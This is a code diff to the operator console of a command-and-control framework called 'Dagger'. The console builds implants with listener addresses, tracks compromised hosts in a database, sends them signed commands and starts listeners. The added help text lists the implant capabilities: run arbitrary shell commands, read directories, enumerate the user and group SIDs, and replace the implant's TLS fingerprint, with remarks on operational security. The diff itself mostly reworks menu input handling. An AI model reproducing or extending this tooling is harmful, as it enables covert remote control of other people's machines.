@@ -433,6 +433,11 @@ func build(platform, arch, name, listener, jitter string, sleep int32) (uint16, 
 	return uint16(res.GetCode()), nil
 }
 
+func empty(s string) bool {
+	trimmed := strings.TrimSpace(s)
+	return len(trimmed) == 0
+}
+
 func main() {
 	var wg sync.WaitGroup
 	stopCh := make(chan struct{})
@@ -453,11 +458,21 @@ func main() {
 			fmt.Printf("\n%sDagger controller home menu \n%s", yellow, reset)
 			fmt.Printf("Type help for the info menu \n")
 			fmt.Printf("%scontroller > %s", blue, reset)
-			fmt.Scan(&input)
-			input = strings.ToLower(input)
+			fmt.Scanf("%s", &input)
+			isEmpty := empty(input)
 
-			switch input {
-			case "1":
+			switch {
+			case isEmpty:
+				fmt.Printf("Help menu \n")
+				fmt.Printf("The interpreter expects 1 - 5 for menu options \n")
+				fmt.Printf("1 will bring you to the build menu where you can build an implant \n")
+				fmt.Printf("2 will bring you to the implant info menu where you can find the last command run and the result \n")
+				fmt.Printf("3 will you to list all implants in the DB \n")
+				fmt.Printf("4 allows you to interact with implants by setting commands \n")
+				fmt.Printf("5 will let you start a listener on an address and port combo \n")
+				fmt.Printf("'help' will bring you to this menu \n")
+			case input == "1":
+				fmt.Printf(input)
 				var platform, arch, name, listener, jitter string
 				var sleep int32
 				fmt.Printf("Build menu \n")
@@ -466,7 +481,10 @@ func main() {
 				fmt.Printf("The builder expects, in order, the platform to compile for, the architecture, the output file name, and the listener address and port to use \n")
 				fmt.Printf("windows amd64 example https://test.culbertreport:8000 \n")
 				fmt.Printf("%sBuilder > %s", red, reset)
-				fmt.Scan(&platform, &arch, &name, &listener)
+				fmt.Scanf("%s %s %s %s", &platform, &arch, &name, &listener)
+				if platform == "exit" {
+					break
+				}
 				fmt.Printf("%sJitter (High, medium, low) > %s", red, reset)
 				fmt.Scan(&jitter)
 				fmt.Printf("%sSleep (In seconds) > %s", red, reset)
@@ -491,7 +509,7 @@ func main() {
 					fmt.Printf("Type exit and hit return to leave at any time \n")
 				}
 
-			case "2":
+			case input == "2":
 				var uuid string
 				fmt.Printf("Implant history menu \n")
 				fmt.Printf("Here's where you can interact with all your fun implants \n")
@@ -526,7 +544,7 @@ func main() {
 
 				}
 
-			case "3":
+			case input == "3":
 				var key string
 				fmt.Printf("Lists all implants and deets \n")
 				fmt.Printf("Just need the key to search for, in most cases this will be UUID \n")
@@ -548,7 +566,7 @@ func main() {
 					fmt.Println(res)
 				}
 
-			case "4":
+			case input == "4":
 				// Need to get a signature
 				// Need to set that signature and command
 				// Need to then wait for the listener to update the db that the command was retrieved
@@ -583,6 +601,19 @@ func main() {
 					if cmd == "exit" {
 						break
 					}
+					if cmd == "" {
+						fmt.Println("'pwd' gets the current working directory ")
+						fmt.Println("'gcu' gets the current user by querying the security context ")
+						fmt.Println("'rc' runs a command through the terminal, this can be anything ")
+						fmt.Println("'rd' reads the supplied directory  ")
+						fmt.Println("'terminal' allows you to run terminal commands - NOT OPSEC SAFE ")
+						fmt.Println("'groups' returns the SID of all local groups the user is in ")
+						fmt.Println("'pid' returns the current process ID ")
+						fmt.Println("'fing' followed by a new TLS fingerprint overwrites the one the implant currently uses ")
+						fmt.Println("Use this with the utmost care. If you put in a fingerprint that is invalid or otherwise doesn't work, you will no longer be able to execute commands")
+						fmt.Println("'exit' brings you back to the main menu ")
+						fmt.Printf("%sEnter the command you want executed > %s", red, reset)
+					}
 					sig, err := sign(cmd)
 					if err != nil {
 						fmt.Print(err)
@@ -595,7 +626,7 @@ func main() {
 						fmt.Printf("Command set \n")
 					}
 				}
-			case "5":
+			case input == "5":
 				var address, port string
 				fmt.Printf("Listeners \n")
 				fmt.Printf("Start a listener \n")
@@ -615,7 +646,7 @@ func main() {
 				}
 				fmt.Println("Started")
 
-			case "help":
+			case input == "help":
 				fmt.Printf("Help menu \n")
 				fmt.Printf("The interpreter expects 1 - 5 for menu options \n")
 				fmt.Printf("1 will bring you to the build menu where you can build an implant \n")
